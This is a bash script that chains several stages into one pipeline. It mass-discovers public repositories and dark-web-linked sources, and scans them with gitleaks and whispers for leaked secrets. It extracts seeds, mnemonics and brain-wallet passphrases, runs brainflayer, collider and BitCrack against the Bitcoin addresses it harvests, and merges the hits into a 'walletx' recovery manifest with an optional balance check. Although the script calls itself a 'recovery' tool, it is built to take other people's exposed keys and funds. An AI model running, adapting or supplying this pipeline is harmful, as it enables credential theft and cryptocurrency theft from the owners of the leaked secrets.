#!/bin/bash
# =============================================================================
# dashscan.sh — Unified secret-surface → recovery pipeline
#
# Alias: alias dashscan='bash ~/dashscan.sh'
#
# Single entry point that orchestrates:
#   7000.py → gitleaks → whispers → onion_scanner → pow_recover
#              ↑ brainflayer / collider / bitcrack
#              All fed from the SAME source: paste_box.txt
#
# Usage:
#   dashgo                          # Full pipeline (target 10000)
#   dashgo --target 50000           # Larger target
#   dashgo --topics darkweb         # Dark-web only
#   dashgo --deep --check-balances  # Deep search + live balance check
#   dashgo --install-only           # Just install tools, don't scan
#   dashgo --skip-discovery         # Use existing paste_box.txt
#   dashgo --help                   # Show this
# =============================================================================
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" && pwd)"
cd "$SCRIPT_DIR"

GREEN='\033[92m'; RED='\033[91m'; YELLOW='\033[93m'; CYAN='\033[96m'; MAGENTA='\033[95m'
BOLD='\033[1m'; DIM='\033[2m'; RESET='\033[0m'
BGRN='\033[1;92m'; BRED='\033[1;91m'; BYEL='\033[1;93m'; BCYN='\033[1;96m'

log()   { echo -e "${GREEN}[+]${RESET} $*"; }
warn()  { echo -e "${YELLOW}[!]${RESET} $*"; }
err()   { echo -e "${RED}[X]${RESET} $*"; }
info()  { echo -e "${CYAN}[*]${RESET} $*"; }
step()  { echo -e "\n${BOLD}${CYAN}━━━ $* ━━━${RESET}"; }
hit()   { echo -e "${GREEN}  OK ${RESET}$*"; }
miss()  { echo -e "${RED}  -- ${RESET}$*"; }

# ── Defaults ──────────────────────────────────────────────────────────
TARGET="${TARGET:-10000}"
TOPICS="${TOPICS:-all}"
ENGINES="${ENGINES:-github,gitlab,docker,bitbucket,huggingface,postman}"
DEEP=""; FRESH=""; CHECK_BALANCES=""; INSTALL_ONLY=""; SKIP_DISCOVERY=""; SKIP_INSTALL=""
PASTE_BOX="paste_box.txt"

# ── Parse args ────────────────────────────────────────────────────────
while [[ $# -gt 0 ]]; do
    case "$1" in
        --target) TARGET="$2"; shift 2 ;;
        --topics) TOPICS="$2"; shift 2 ;;
        --engines) ENGINES="$2"; shift 2 ;;
        --deep) DEEP="--deep"; shift ;;
        --fresh) FRESH="--fresh"; shift ;;
        --check-balances) CHECK_BALANCES="--check-balances"; shift ;;
        --install-only) INSTALL_ONLY="1"; shift ;;
        --skip-discovery) SKIP_DISCOVERY="1"; shift ;;
        --skip-install) SKIP_INSTALL="1"; shift ;;
        -h|--help)
            echo "dashgo — Unified secret-surface → recovery spawner"
            echo ""
            echo "Usage: dashgo [flags]"
            echo "  --target N         Target repos (default: 10000)"
            echo "  --topics TIER      crypto|infra|general|darkweb|all"
            echo "  --engines LIST     Comma-separated engines"
            echo "  --deep             Enable deep code/blob search"
            echo "  --fresh            Truncate output, start clean"
            echo "  --check-balances   Query blockchain APIs"
            echo "  --install-only     Install tools only"
            echo "  --skip-discovery   Use existing paste_box.txt"
            echo "  --skip-install     Skip tool installation"
            echo ""
            echo "Pipeline: 7000.py → gitleaks → whispers → onion_scanner → pow_recover → walletx"
            exit 0 ;;
        *) warn "Unknown: $1"; exit 1 ;;
    esac
done

# ════════════════════════════════════════════════════════════════════════
echo ""
echo -e "${BOLD}${BCYN}"
echo "  DASHGO — secret-surface → recovery pipeline"
echo "  7000.py → gitleaks → whispers → onion_scanner → pow_recover → walletx"
echo -e "${RESET}"
echo "  Target: ${TARGET}  Topics: ${TOPICS}  Engines: ${ENGINES}"
echo "  Deep: ${DEEP:-no}  Balances: ${CHECK_BALANCES:-no}"
echo ""

START_TIME=$(date +%s)

# ════════════════════════════════════════════════════════════════════════
# PHASE 0: TOOL INSTALL
# ════════════════════════════════════════════════════════════════════════
if [[ -z "$SKIP_INSTALL" ]]; then
    step "PHASE 0: Tool Installation"
    if [[ -f tools/install_all.sh ]]; then
        source tools/install_all.sh
        install_all_tools
    else
        warn "tools/install_all.sh not found — skipping tool install"
    fi
    if [[ -n "$INSTALL_ONLY" ]]; then
        log "Install-only mode — done."; exit 0
    fi
fi

# Re-source to pick up newly installed tools
[[ -f tools/install_all.sh ]] && source tools/install_all.sh 2>/dev/null || true

# ── Tool detection ─────────────────────────────────────────────────────
HAVE_GITLEAKS=false; HAVE_WHISPERS=false; HAVE_BRAINFLAYER=false
HAVE_COLLIDER=false; HAVE_BITCRACK=false

GITLEAKS_CMD="${GITLEAKS_BIN:-}"
command -v gitleaks &>/dev/null && GITLEAKS_CMD="gitleaks" && HAVE_GITLEAKS=true
[[ -n "$GITLEAKS_CMD" ]] && [[ -x "$GITLEAKS_CMD" ]] && HAVE_GITLEAKS=true

WHISPERS_CMD="${WHISPERS_BIN:-}"
command -v whispers &>/dev/null && WHISPERS_CMD="whispers" && HAVE_WHISPERS=true

BRAINFLAYER_CMD="${BRAINFLAYER_BIN:-}"
command -v brainflayer &>/dev/null && BRAINFLAYER_CMD="brainflayer" && HAVE_BRAINFLAYER=true

COLLIDER_CMD="${COLLIDER_BIN:-}"
command -v collider &>/dev/null && COLLIDER_CMD="collider" && HAVE_COLLIDER=true
command -v LBC &>/dev/null && COLLIDER_CMD="LBC" && HAVE_COLLIDER=true

BITCRACK_CMD="${BITCRACK_BIN:-}"
command -v bitcrack &>/dev/null && BITCRACK_CMD="bitcrack" && HAVE_BITCRACK=true
command -v BitCrack &>/dev/null && BITCRACK_CMD="BitCrack" && HAVE_BITCRACK=true

echo ""
info "Tool availability:"
$HAVE_GITLEAKS   && hit "gitleaks    → $GITLEAKS_CMD"   || miss "gitleaks    (pkg install golang && go install github.com/gitleaks/gitleaks/v8@latest)"
$HAVE_WHISPERS    && hit "whispers    → $WHISPERS_CMD"    || miss "whispers    (pip install whispers)"
$HAVE_BRAINFLAYER && hit "brainflayer → $BRAINFLAYER_CMD" || miss "brainflayer (needs: clang make openssl)"
$HAVE_COLLIDER    && hit "collider    → $COLLIDER_CMD"    || miss "collider    (needs: cmake gcc)"
$HAVE_BITCRACK    && hit "bitcrack    → $BITCRACK_CMD"    || miss "bitcrack    (needs: cuda/opencl + cmake)"
echo ""

# ════════════════════════════════════════════════════════════════════════
# PHASE 1: SURFACE DISCOVERY — 7000.py
# ════════════════════════════════════════════════════════════════════════
if [[ -z "$SKIP_DISCOVERY" ]]; then
    step "PHASE 1: Surface Discovery (7000.py → paste_box.txt)"
    CMD="python3 7000.py --target ${TARGET} --topics ${TOPICS} --engines ${ENGINES}"
    [[ -n "$DEEP" ]] && CMD="$CMD --deep"
    [[ -n "$FRESH" ]] && CMD="$CMD --fresh"
    log "Running: $CMD"
    eval "$CMD" || warn "7000.py had errors but may have partial results"
    log "Phase 1 complete — paste_box.txt ready"
else
    step "PHASE 1: SKIPPED (--skip-discovery)"
    [[ -f "$PASTE_BOX" ]] || { err "paste_box.txt not found!"; exit 1; }
    info "Using existing paste_box.txt ($(wc -l < "$PASTE_BOX") entries)"
fi

# ── Onion→clearnet correlation ────────────────────────────────────────
if [[ -f "$PASTE_BOX" ]]; then
    python3 -c "
import json, re, os
from datetime import datetime, timezone
onion_re = re.compile(r'[a-z2-7]{56}\.onion')
corrs = []
with open('$PASTE_BOX', 'r', errors='ignore') as f:
    for line in f:
        line = line.strip()
        if not line: continue
        parts = line.split('|')
        if len(parts) < 5: continue
        url = parts[0].replace('\\\\\\\\|', '|')
        topic = parts[3].replace('\\\\\\\\|', '|') if len(parts) > 3 else ''
        source = parts[4].replace('\\\\\\\\|', '|') if len(parts) > 4 else ''
        m = onion_re.search(line)
        if m:
            conf = 'low'
            if 'onion' in topic.lower() or 'hidden-service' in topic.lower():
                conf = 'high'
            elif 'darknet' in topic.lower() or 'tor' in topic.lower():
                conf = 'medium'
            corrs.append({
                'onion': m.group(0), 'clearnet_repo': url,
                'topic': topic, 'source': source,
                'confidence': conf,
                'discovered_at': datetime.now(timezone.utc).isoformat(),
            })
with open('onion_correlations.jsonl', 'w') as out:
    for c in corrs:
        out.write(json.dumps(c, ensure_ascii=False) + '\n')
print(f'  onion-correlate: {len(corrs)} leaks → onion_correlations.jsonl')
for c in [c for c in corrs if c['confidence']=='high'][:5]:
    print(f'    ! {c[\"onion\"]} → {c[\"clearnet_repo\"]}')
" 2>/dev/null || true
fi

# ════════════════════════════════════════════════════════════════════════
# PHASE 2: SECRET SCANNING — gitleaks + whispers
# ════════════════════════════════════════════════════════════════════════
step "PHASE 2: Secret Scanning (gitleaks + whispers)"
GITLEAKS_OUT="dashgo_gitleaks.json"
WHISPERS_OUT="dashgo_whispers.json"

# ── gitleaks ───────────────────────────────────────────────────────────
if $HAVE_GITLEAKS && [[ -f "$PASTE_BOX" ]]; then
    info "gitleaks: scanning repos from paste_box.txt..."
    REPO_LIST="/tmp/dashgo_repos_$$.txt"
    cut -d'|' -f1 "$PASTE_BOX" 2>/dev/null | \
        sed 's/\\|/|/g' | grep -oP 'https?://[^|]+' | \
        sort -u | head -50 > "$REPO_LIST" 2>/dev/null || true
    RCOUNT=$(wc -l < "$REPO_LIST" 2>/dev/null || echo 0)
    info "gitleaks: scanning $RCOUNT repos..."
    > "$GITLEAKS_OUT"
    cnt=0
    while IFS= read -r repo_url; do
        [[ -z "$repo_url" ]] && continue
        ((cnt++))
        tmpdir="/tmp/dashgo_gl_$$_${cnt}"
        if git clone --depth 1 "$repo_url" "$tmpdir" 2>/dev/null; then
            $GITLEAKS_CMD detect --source="$tmpdir" --report-format=json \
                --report-path="$tmpdir/gl_report.json" --no-git 2>/dev/null && \
                cat "$tmpdir/gl_report.json" >> "$GITLEAKS_OUT" 2>/dev/null || true
            rm -rf "$tmpdir" 2>/dev/null || true
        fi
        (( cnt % 10 == 0 )) && info "  gitleaks: $cnt/$RCOUNT..."
    done < "$REPO_LIST"
    rm -f "$REPO_LIST" 2>/dev/null
    GL_COUNT=$(python3 -c "import json; c=0
try:
 with open('$GITLEAKS_OUT') as f:
  for l in f:
   try:
    if json.loads(l.strip()): c+=1
   except: pass
except: pass; print(c)" 2>/dev/null || echo 0)
    log "gitleaks: $GL_COUNT findings → $GITLEAKS_OUT"
else
    warn "gitleaks not available — skipping"
    echo "[]" > "$GITLEAKS_OUT"
fi

# ── whispers ───────────────────────────────────────────────────────────
if $HAVE_WHISPERS && [[ -f "$PASTE_BOX" ]]; then
    info "whispers: scanning paste_box.txt..."
    $WHISPERS_CMD "$PASTE_BOX" --output "$WHISPERS_OUT" 2>/dev/null || \
        warn "whispers scan had issues"
    WS_COUNT=$(python3 -c "import json
try:
 with open('$WHISPERS_OUT') as f:
  d=json.load(f)
  print(len(d) if isinstance(d,list) else 1)
except: print(0)" 2>/dev/null || echo 0)
    log "whispers: $WS_COUNT findings → $WHISPERS_OUT"
else
    warn "whispers not available — skipping"
    echo "[]" > "$WHISPERS_OUT"
fi

# ════════════════════════════════════════════════════════════════════════
# PHASE 3: DEEP DECODE — onion_scanner.py
# ════════════════════════════════════════════════════════════════════════
step "PHASE 3: Deep Decode (onion_scanner.py)"
ONION_OUT="dashgo_onion_scanner.jsonl"

if [[ -f onion_scanner.py ]] && [[ -f "$PASTE_BOX" ]]; then
    python3 onion_scanner.py --input "$PASTE_BOX" --type paste_box \
        --output "$ONION_OUT" ${DEEP:+--deep} 2>&1 | tail -5

    if [[ -s "$GITLEAKS_OUT" ]]; then
        python3 onion_scanner.py --input "$GITLEAKS_OUT" --type file \
            --output "dashgo_onion_gitleaks.jsonl" 2>&1 | tail -3 || true
    fi
    if [[ -s "$WHISPERS_OUT" ]]; then
        python3 onion_scanner.py --input "$WHISPERS_OUT" --type file \
            --output "dashgo_onion_whispers.jsonl" 2>&1 | tail -3 || true
    fi

    ONION_TOTAL=$(python3 -c "
t=0
for f in ['$ONION_OUT','dashgo_onion_gitleaks.jsonl','dashgo_onion_whispers.jsonl']:
 try:
  with open(f) as fh: t+=sum(1 for _ in fh)
 except: pass
print(t)" 2>/dev/null || echo 0)
    log "onion_scanner: $ONION_TOTAL total decoded findings"
else
    warn "onion_scanner.py not found — skipping"
fi

# ════════════════════════════════════════════════════════════════════════
# PHASE 4: POW COIN RECOVERY
# ════════════════════════════════════════════════════════════════════════
step "PHASE 4: POW Coin Recovery"
RECOVER_OUT="dashgo_recover_manifest.jsonl"

if [[ -f pow_recover.py ]] && [[ -f "$PASTE_BOX" ]]; then
    RECOVER_ARGS="--output $RECOVER_OUT"
    [[ -n "$CHECK_BALANCES" ]] && RECOVER_ARGS="$RECOVER_ARGS --check-balances"
    python3 pow_recover.py --input "$PASTE_BOX" $RECOVER_ARGS 2>&1 | tail -10

    if [[ -f "$ONION_OUT" ]] && [[ -s "$ONION_OUT" ]]; then
        python3 pow_recover.py --input "$ONION_OUT" \
            --output "dashgo_recover_from_onion.jsonl" \
            $CHECK_BALANCES 2>&1 | tail -5 || true
    fi
fi

# ── brainflayer wrapper ────────────────────────────────────────────────
BF_OUT="dashgo_brainflayer.jsonl"
if $HAVE_BRAINFLAYER && [[ -f "$PASTE_BOX" ]]; then
    info "brainflayer: extracting brain wallet hints..."
    BF_INPUT="/tmp/dashgo_bf_$$.txt"
    python3 -c "
import re
r = re.compile(r'(?:brain\s*wallet|brainwallet|passphrase|seed|mnemonic)', re.I)
with open('$PASTE_BOX','r',errors='ignore') as f:
    for line in f:
        p=line.strip().split('|')
        if len(p)>=4 and r.search(p[3].replace('\\\\\\\\|','|')):
            print(p[3].replace('\\\\\\\\|','|')[:200])
" > "$BF_INPUT" 2>/dev/null

    if [[ -s "$BF_INPUT" ]]; then
        info "brainflayer: scanning $(wc -l < "$BF_INPUT") hints..."
        $BRAINFLAYER_CMD -i "$BF_INPUT" -o "$BF_OUT" 2>/dev/null || \
            warn "brainflayer run had issues"
        [[ -s "$BF_OUT" ]] && log "brainflayer: results → $BF_OUT"
    fi
    rm -f "$BF_INPUT" 2>/dev/null
fi

# ── collider wrapper (background) ──────────────────────────────────────
COLLIDER_OUT="dashgo_collider.jsonl"
if $HAVE_COLLIDER && [[ -f "$PASTE_BOX" ]]; then
    COL_TARGETS="/tmp/dashgo_col_$$.txt"
    python3 -c "
import re
addr_re=re.compile(r'[13][a-km-zA-HJ-NP-Z1-9]{25,34}')
with open('$PASTE_BOX','r',errors='ignore') as f:
    for line in f:
        for m in addr_re.finditer(line):
            print(m.group(0))
" | sort -u | head -100 > "$COL_TARGETS" 2>/dev/null

    if [[ -s "$COL_TARGETS" ]]; then
        info "collider: targeting $(wc -l < "$COL_TARGETS") addresses (background)"
        nohup $COLLIDER_CMD -i "$COL_TARGETS" -o "$COLLIDER_OUT" \
            > /dev/null 2>&1 &
        COL_PID=$!
        echo "  collider PID: $COL_PID"
    fi
fi

# ── bitcrack wrapper (background) ──────────────────────────────────────
BITCRACK_OUT="dashgo_bitcrack.jsonl"
if $HAVE_BITCRACK && [[ -f "$PASTE_BOX" ]]; then
    BC_TARGETS="/tmp/dashgo_bc_$$.txt"
    python3 -c "
import re
addr_re=re.compile(r'[13][a-km-zA-HJ-NP-Z1-9]{25,34}')
with open('$PASTE_BOX','r',errors='ignore') as f:
    for line in f:
        for m in addr_re.finditer(line):
            print(m.group(0))
" | sort -u | head -50 > "$BC_TARGETS" 2>/dev/null

    if [[ -s "$BC_TARGETS" ]]; then
        info "BitCrack: targeting $(wc -l < "$BC_TARGETS") addresses (background)"
        nohup $BITCRACK_CMD --keyspace 1:100000000 \
            -i "$BC_TARGETS" -o "$BITCRACK_OUT" \
            > /dev/null 2>&1 &
        BC_PID=$!
        echo "  BitCrack PID: $BC_PID"
    fi
fi

# ════════════════════════════════════════════════════════════════════════
# PHASE 5: MERGE → walletx
# ════════════════════════════════════════════════════════════════════════
step "PHASE 5: Merge → walletx"
FINAL="dashgo_final_manifest.jsonl"
> "$FINAL"

for mf in "$RECOVER_OUT" "dashgo_recover_from_onion.jsonl" \
          "$BF_OUT" "$COLLIDER_OUT" "$BITCRACK_OUT" \
          "onion_correlations.jsonl"; do
    [[ -f "$mf" ]] && [[ -s "$mf" ]] && cat "$mf" >> "$FINAL" 2>/dev/null || true
done

# Dedup
if [[ -s "$FINAL" ]]; then
    python3 -c "
import json
seen=set()
uniq=[]
with open('$FINAL','r',errors='ignore') as f:
    for line in f:
        line=line.strip()
        if not line: continue
        try:
            rec=json.loads(line)
            key=json.dumps(rec,sort_keys=True)
            if key not in seen:
                seen.add(key)
                uniq.append(rec)
        except: continue
with open('$FINAL','w') as out:
    for u in uniq:
        out.write(json.dumps(u,ensure_ascii=False)+'\n')
print(len(uniq))
" 2>/dev/null
fi

FINAL_COUNT=$(wc -l < "$FINAL" 2>/dev/null || echo 0)
ELAPSED=$(( $(date +%s) - START_TIME ))

# ════════════════════════════════════════════════════════════════════════
# SUMMARY
# ════════════════════════════════════════════════════════════════════════
echo ""
echo -e "${BOLD}${BCYN}═══════════════════════════════════════════════════${RESET}"
echo -e "${BOLD}${BCYN}  DASHGO COMPLETE — ${ELAPSED}s${RESET}"
echo -e "${BOLD}${BCYN}═══════════════════════════════════════════════════${RESET}"
echo ""
echo "Output files:"
for f in paste_box.txt onion_correlations.jsonl dashgo_gitleaks.json \
         dashgo_whispers.json dashgo_onion_scanner.jsonl \
         dashgo_recover_manifest.jsonl dashgo_final_manifest.jsonl; do
    if [[ -f "$f" ]] && [[ -s "$f" ]]; then
        printf "  %-45s %6s lines\n" "$f" "$(wc -l < "$f")"
    fi
done
echo ""
echo -e "${BGRN}  FINAL MANIFEST: ${FINAL_COUNT} walletx entries → dashgo_final_manifest.jsonl${RESET}"
echo ""
echo "  Import:  cat dashgo_final_manifest.jsonl | walletx import"
echo "  Recover: walletx recover --manifest dashgo_final_manifest.jsonl"
echo ""

# Gold mine assessment
if [[ "$FINAL_COUNT" -gt 0 ]]; then
    HC=$(python3 -c "
import json; h=0
try:
 with open('dashgo_final_manifest.jsonl') as f:
  for l in f:
   try:
    r=json.loads(l.strip())
    if r.get('confidence') in ('high','critical'): h+=1
   except: pass
except: pass; print(h)" 2>/dev/null || echo 0)
    [[ "$HC" -gt 0 ]] && echo -e "${BRED}  !! ${HC} high-confidence items — run with --check-balances to evaluate${RESET}"
fi

echo ""
log "dashgo complete. $(date)"
